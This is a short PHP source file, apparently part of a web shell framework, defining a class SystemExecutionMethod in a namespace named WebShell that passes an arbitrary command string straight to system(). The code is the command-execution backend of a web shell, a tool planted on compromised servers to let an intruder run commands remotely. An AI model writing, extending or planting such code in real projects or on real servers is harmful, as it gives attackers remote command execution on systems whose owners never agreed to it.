<?php
namespace WebShell;

final class SystemExecutionMethod extends BlindExecutionMethod
{
    protected function run_command(string $cmd): void
    {
        system($cmd);
    }
}
?>
